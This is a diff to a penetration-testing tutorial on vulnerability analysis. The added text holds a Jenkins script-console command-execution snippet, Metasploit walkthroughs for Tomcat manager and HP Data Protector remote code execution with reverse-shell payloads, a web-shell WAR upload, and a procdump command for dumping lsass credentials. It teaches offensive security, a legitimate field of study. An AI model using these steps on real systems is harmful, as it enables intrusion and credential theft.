@@ -1,6 +1,6 @@
-=============================================================
-Learning from the field : Enumeration - Basic Network Hygiene
-=============================================================
+=======================================================================================
+Learning from the field : Infrastruture PenTest Series : Part 2 - Vulnerability Analysis
+=======================================================================================
 
 So, by using **intelligence gathering** you have completed the normal scanning and banner grabbing. Yay!!. Now, it's time for some **metasploit-fu** and **nmap-fu**.
 
@@ -1135,6 +1135,21 @@ Moving on to
    uid=109(jenkins) gid=117(jenkins) groups=117(jenkins)
    $
 
+  If the above metasploit modules doesn't work, we can perform code execution manually. Visit the jenkins web page > Manage Jenkins (options on the left side ) > script console . In the script console page. copy and paste the below code into the editable area.
+
+  :: 
+
+	def sout = new StringBuffer(), serr = new StringBuffer()
+	def proc = '[INSERT COMMAND]'.execute()
+	proc.consumeProcessOutput(sout, serr)
+	proc.waitForOrKill(1000)
+	println "out> $sout err> $serr"
+
+
+  In place of '[INSERT COMMAND]' we can use powershell Empire launcher or Web_delivery powershell inject code to get an agent or meterpreter shell on our attacking machine.
+
+  The above has been taken from `Hacking Jenkins Servers with No Password <https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password>`_ Also, Leonjza has written a blog `Jenkins to Meterpreter - toying with powersploit <https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/>`_ which could provide more idea.
+
 * **Apache Tomcat**
 
  Searching for Tomcat
@@ -1182,7 +1197,92 @@ Moving on to
   [+] 10.87.xx.xx:8080 - LOGIN SUCCESSFUL: admin:admin
   [+] 10.10.xx.xx:80 - LOGIN SUCCESSFUL: tomcat:tomcat
 
-  Yay :) We got two apache tomcat we can upload WAR files and get shell ;)
+ Yay :) We got two apache tomcat we can upload WAR files and get shell ;)
+
+
+ There are four ways ( in my knowledge to exploit this)
+
+  * Apache Tomcat Manager Application Deployer Authenticated Code Execution ( tomcat_mgr_deploy )
+  * Apache Tomcat Manager Authenticated Upload Code Execution ( tomcat_mgr_upload )
+
+   use either of them to exploit the application. by
+
+   :: 
+
+	msf > use exploit/multi/http/tomcat_mgr_deploy
+	msf exploit(tomcat_mgr_deploy) > show options
+	Module options (exploit/multi/http/tomcat_mgr_deploy):
+	Name          Current Setting  Required  Description
+	----          ---------------  --------  -----------
+	HttpPassword                   no        The password for the specified username
+	HttpUsername                   no        The username to authenticate as
+	PATH          /manager         yes       The URI path of the manager app (/deploy and /undeploy will be used)
+	Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
+	RHOST                          yes       The target address
+	RPORT         80               yes       The target port (TCP)
+	SSL           false            no        Negotiate SSL/TLS for outgoing connections
+	VHOST                          no        HTTP server virtual host
+
+	Exploit target:
+
+	Id  Name
+	--  ----
+	0   Automatic
+
+   set the values required by exploit aad set the suitable payload and exploit. The successful exploitation will give us shell of the victim machine. The payload options can be viewed by  using the command 
+
+   :: 
+
+	show payloads
+
+   The payload options available for this exploit is 
+
+   :: 
+
+	Compatible Payloads
+	===================
+	Name                            Disclosure Date  Rank    Description
+	----                            ---------------  ----    -----------
+	generic/custom                                   normal  Custom Payload
+	generic/shell_bind_tcp                           normal  Generic Command Shell, Bind TCP Inline
+	generic/shell_reverse_tcp                        normal  Generic Command Shell, Reverse TCP Inline
+	java/meterpreter/bind_tcp                        normal  Java Meterpreter, Java Bind TCP Stager
+	java/meterpreter/reverse_http                    normal  Java Meterpreter, Java Reverse HTTP Stager
+	java/meterpreter/reverse_https                   normal  Java Meterpreter, Java Reverse HTTPS Stager
+	java/meterpreter/reverse_tcp                     normal  Java Meterpreter, Java Reverse TCP Stager
+	java/shell/bind_tcp                              normal  Command Shell, Java Bind TCP Stager
+	java/shell/reverse_tcp                           normal  Command Shell, Java Reverse TCP Stager
+	java/shell_reverse_tcp                           normal  Java Command Shell, Reverse TCP Inline
+
+
+  set the payload option (depending upon the target's operating system which can be selected by set TARGET <ID>) by using 
+
+   :: 
+
+    set payload java/meterpreter/reverse_https    -to directly get a meterpreter shell.
+    or
+    set payload java/shell/reverse_tcp	          -to get the system level shell
+
+
+  Once we have obtained a meterepreter shell we can use getsystem to run the shell with an administrative rights,
+
+  Wait, what if the exploitation doesnt wrk ?????????....in that case we can exploit the application by another way. :)  
+
+  * Web-Shell: The exploit whih we learned above, uploads or deploys the malicious payload into the application and runs it. some times this may not work as it is supposed to be in that case we can directly upload a shell using a WAR file deployment funtionality given in the /manager/html page. This WAR file contains nothing but a small code of obtaining a shell called cmd.war file. The code can be downloaded from the link `Laudanum Shells <https://github.com/jbarcia/Web-Shells/tree/master/laudanum>`_.
+
+    Once you have downloaded the file upload the file to the application. also Download the procdump.exe from `ProcDump <https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx>`_. Copy the procdump file inside the .WAR previously downloaded and upload the modified file to the application. The idea of uploading the procdump with the WAR file is to obtain a lsass.exe process's dump.
+
+   .. Note :: Lsass.exe (Local security Authority Subsystem Service)  is responsible for enforcing the security policy on the system. It verifies users logging on to a Windows computer or server,handles password   changes, and creates access tokens. Dumping this process will give us file Lsass.DMP file which can be used to crack the windows machines password in offline with the help of famous mimikatz
+
+   the lsass.exe process dump can be taken by 
+
+   :: 
+  
+    cmd /c "cd C:\<Path to the procdump file> & procdump -acceptula -ma lsass.exe MYdmp.dmp"
+
+   After uploading the WAR file, The system level shell could be obtained by tampering the url http://<IP Address>/manager/cmd.war/cmd.jsp , should directly give us the shell in the page itself
+
+  * `Jsp File Browser <http://vonloesch.de/filebrowser.html>`_: Install file browser java server page. This JSP program allows remote web-based file access and manipulation. Able to upload-download, execute commands. 
 
 * Searching for **Canon**
 
@@ -1315,16 +1415,16 @@ Nmap has
 
  ::
 
-  nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='VF-ROOT'" 10.74.251.24
+  nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='XX-ROOT'" 10.74.251.24
   
   Starting Nmap 7.01 ( https://nmap.org ) at 2016-05-23 12:13 IST
-  Nmap scan report for ecindc312vw.internal.vodafone.com (10.74.251.24)
+  Nmap scan report for ecxxxxx312vw.internal.xxxxxxxx.com (10.74.251.24)
   Host is up (0.0015s latency).
   PORT   STATE SERVICE
   88/tcp open  kerberos-sec
   | krb5-enum-users: 
   | Discovered Kerberos principals
-  |_    root@VF-ROOT
+  |_    root@XX-ROOT
   
   Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds
 
@@ -3565,6 +3665,92 @@ Postgresql - Port 5432
  ::
 
   use auxiliary/scanner/postgres/postgres_dbname_flag_injection
+
+Port: 5555 HPDataProtector RCE
+--------------------------------------------------------------
+
+HPData proctector service was running on port no. 5555. 
+
+::
+
+  msf > services -p 5555
+
+  Services
+  ========
+  host         	port  proto  name      state  info
+  ----         	----  -----  ----      -----  ----
+  10.x.x.x	5555  tcp    omniback  open   HP OpenView Omniback/Data Protector
+  10.x.x.x  	5555  tcp    omniinet  open   HP Data Protector 7.00 build 105
+  10.x.x.x 	5555  tcp    freeciv   open   
+  10.x.x.x  	5555  tcp    omniinet  open   HP Data Protector 7.00 build 105
+  10.x.x.x   	5555  tcp    omniback  open   HP Data Protector A.07.00 internal build 105; built on Wednesday, October 16, 2013, 10:55 PM
+
+Metasploit framework comes with an exploit for  exploiting this vulnerability. which can be searched by 
+
+:: 
+
+  msf > search integutil
+
+  Matching Modules
+  ================
+
+   Name                                                 Disclosure Date  Rank   Description
+   ----                                                 ---------------  ----   -----------
+   exploit/multi/misc/hp_data_protector_exec_integutil  2014-10-02       great  HP Data Protector EXEC_INTEGUTIL Remote Code ExecutionNOw 
+
+
+Now this can be used by 
+
+:: 
+
+  msf > use exploit/multi/misc/hp_data_protector_exec_integutil
+  msf exploit(hp_data_protector_exec_integutil) > show options
+
+  Module options (exploit/multi/misc/hp_data_protector_exec_integutil):
+
+  Name   Current Setting  Required  Description
+  ----   ---------------  --------  -----------
+  RHOST                   yes       The target address
+  RPORT  5555             yes       The target port (TCP)
+
+  Exploit target:
+  Id  Name
+  --  ----
+  0   Automatic
+
+Select the appropriate target by using 
+
+::
+
+  msf exploit(hp_data_protector_exec_integutil) > show targets 
+
+  Exploit targets:
+
+  Id  Name
+  --  ----
+  0   Automatic
+  1   Linux 64 bits / HP Data Protector 9
+  2   Windows 64 bits / HP Data Protector 9
+
+  msf exploit(hp_data_protector_exec_integutil) > set target 2    - for windows environment.
+		
+set the appropriate RHOST and payloads by 
+
+:: 
+
+  msf exploit(hp_data_protector_exec_integutil) > set RHOST 10.1.1.1
+  RHOST => 10.1.1.1
+  msf exploit(hp_data_protector_exec_integutil) > show payloads 
+
+  Compatible Payloads
+  ===================
+
+  Name                            Disclosure Date  Rank    Description
+  ----                            ---------------  ----    -----------
+  cmd/windows/reverse_powershell                   normal  Windows Command Shell, Reverse TCP (via Powershell)
+
+set all the necessary options and run. After this we can use Empire stagerlauncher or web_delivery to a get a meterpreter shell on our attacking machine.
+
 
 VNC - Port 5900
 -----------------
